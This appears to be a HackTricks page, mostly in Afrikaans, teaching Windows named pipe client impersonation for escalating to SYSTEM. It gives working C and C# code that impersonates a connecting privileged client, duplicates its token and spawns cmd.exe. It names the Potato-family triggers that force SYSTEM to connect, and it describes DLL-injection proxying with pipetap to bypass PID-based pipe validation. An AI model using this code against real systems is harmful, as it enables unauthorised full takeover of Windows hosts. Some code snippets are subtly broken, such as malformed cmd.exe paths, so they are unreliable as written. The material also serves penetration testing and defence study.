# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is 'n lokale privilege escalation primitive wat 'n named-pipe server-draad toelaat om die sekuriteitskonteks van 'n kliënt wat daaraan koppel, aan te neem. In die praktyk kan 'n aanvaller wat kode met SeImpersonatePrivilege kan uitvoer 'n bevoorregte kliënt (bv. 'n SYSTEM-diens) dwing om aan 'n aanvaller-beheerde pipe te koppel, ImpersonateNamedPipeClient aan te roep, die resultaat-token in 'n primêre token te dupliseer, en 'n proses as die kliënt te spawn (dikwels NT AUTHORITY\SYSTEM).

Hierdie bladsy fokus op die kerntegniek. Vir end-to-end exploit chains wat SYSTEM na jou pipe dwing, sien die Potato family pages wat hieronder verwys word.

## TL;DR
- Skep 'n named pipe: \\.\pipe\<random> en wag vir 'n verbinding.
- Kry 'n bevoorregte komponent om daaraan te koppel (spooler/DCOM/EFSRPC/etc.).
- Lees ten minste een boodskap vanaf die pipe, en roep dan ImpersonateNamedPipeClient aan.
- Open die impersonation-token vanaf die huidige draad, DuplicateTokenEx(TokenPrimary), en gebruik CreateProcessWithTokenW/CreateProcessAsUser om 'n SYSTEM-proses te kry.

## Requirements and key APIs
- Privileges wat gewoonlik benodig word deur die oproepende proses/draad:
- SeImpersonatePrivilege om suksesvol 'n koppelende kliënt te kan impersonate en om CreateProcessWithTokenW te gebruik.
- Alternatiewelik, nadat jy SYSTEM geïmpersonate het, kan jy CreateProcessAsUser gebruik, wat moontlik SeAssignPrimaryTokenPrivilege en SeIncreaseQuotaPrivilege benodig (hierdie word voldoen terwyl jy SYSTEM impersonate).
- Kern-APIs wat gebruik word:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (moet ten minste een boodskap lees voordat impersonation gebeur)
- ImpersonateNamedPipeClient en RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW of CreateProcessAsUser
- Impersonation level: om nuttige aksies plaaslik uit te voer, moet die kliënt SecurityImpersonation toelaat (standaard vir baie lokale RPC/named-pipe kliënte). Kliënte kan dit verlaag met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wanneer hulle die pipe oopmaak.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Aantekeninge:
- Indien ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) teruggee, maak seker dat jy eers vanaf die pipe lees en dat die kliënt impersonation nie tot die Identification level beperk het nie.
- Gebruik by voorkeur DuplicateTokenEx met SecurityImpersonation en TokenPrimary om 'n primary token geskik vir process creation te skep.

## .NET vinnige voorbeeld
In .NET kan NamedPipeServerStream via RunAsClient impersonate. Sodra jy impersonating is, dupliseer die thread token en skep 'n proses.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Algemene triggers/afdwingingsmetodes om SYSTEM na jou pipe te kry
Hierdie tegnieke dwing geprivilegieerde dienste om met jou named pipe te verbind sodat jy hulle kan impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC-misbruik & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services kan steeds gekaap word deur die vertroude client te instrumenteer. Tools soos [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) plaas 'n helper DLL in die client, proxieer sy verkeer, en laat jou gemanipuleer met geprivilegieerde IPC voordat die SYSTEM-diens dit verbruik.

### Inline API hooking binne vertroude prosesse
- Inject the helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) in enige client.
- Die DLL gebruik Detours op `ReadFile`, `WriteFile`, ens., maar slegs wanneer `GetFileType` `FILE_TYPE_PIPE` rapporteer, kopieer elke buffer/metagegewens na 'n control pipe, laat jou dit edit/drop/replay, en hervat dan die oorspronklike API.
- Verander die legitieme client in 'n Burp-style proxy: pauzeer UTF-8/UTF-16/raw payloads, trigger foutpaaie, replay reekse, of exporteer JSON-traces.

### Remote client-modus om PID-gebaseerde verifikasie te oorwin
- Inject in 'n allow-listed client, dan kies in die GUI die pipe plus daardie PID.
- Die DLL voer `CreateFile`/`ConnectNamedPipe` binne die vertroude proses uit en stuur die I/O terug aan jou, sodat die bediener steeds die legitieme PID/image waarneem.
- Omseil filters wat staatmaak op `GetNamedPipeClientProcessId` of signed-image kontroles.

### Vinnige enumerasie en fuzzing
- `pipelist` enumereer `\\.\pipe\*`, wys ACLs/SIDs, en stuur inskrywings aan ander modules vir onmiddelike probing.
- Die pipe client/message composer verbind met enige naam en bou UTF-8/UTF-16/raw-hex payloads; importeer captured blobs, muteer velde, en stuur weer om deserializers of unauthenticated command verbs te jag.
- Die helper DLL kan 'n loopback TCP-listener host sodat tooling/fuzzers die pipe op afstand kan bestuur via die Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Kombineer die TCP bridge met VM snapshot restores om kwesbare IPC-parsers te crash-test.

### Operasionele oorwegings
- Named pipes is lae-latensie; lang pouses terwyl buffers gewysig word kan brosdienste in 'n deadlock laat beland.
- Overlapped/completion-port I/O-dekking is gedeeltelik, dus verwag randgevalle.
- Injection is luidrugtig en unsigned, behandel dit dus as 'n lab/exploit-dev helper eerder as 'n stealth implant.

## Probleemoplossing en valklemme
- Jy moet ten minste een boodskap van die pipe lees voordat jy ImpersonateNamedPipeClient aanroep; anders kry jy ERROR_CANNOT_IMPERSONATE (1368).
- As die kliënt koppel met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, kan die bediener nie volledig impersonate nie; kontroleer die token se impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW vereis SeImpersonatePrivilege op die aanroeper. As dit misluk met ERROR_PRIVILEGE_NOT_HELD (1314), gebruik CreateProcessAsUser nadat jy reeds SYSTEM geïmpersonifieer het.
- Maak seker jou pipe se security descriptor laat die teiken-diens toe om te koppel as jy dit verskerp; standaard is pipes onder \\.\pipe toeganklik volgens die bediener se DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
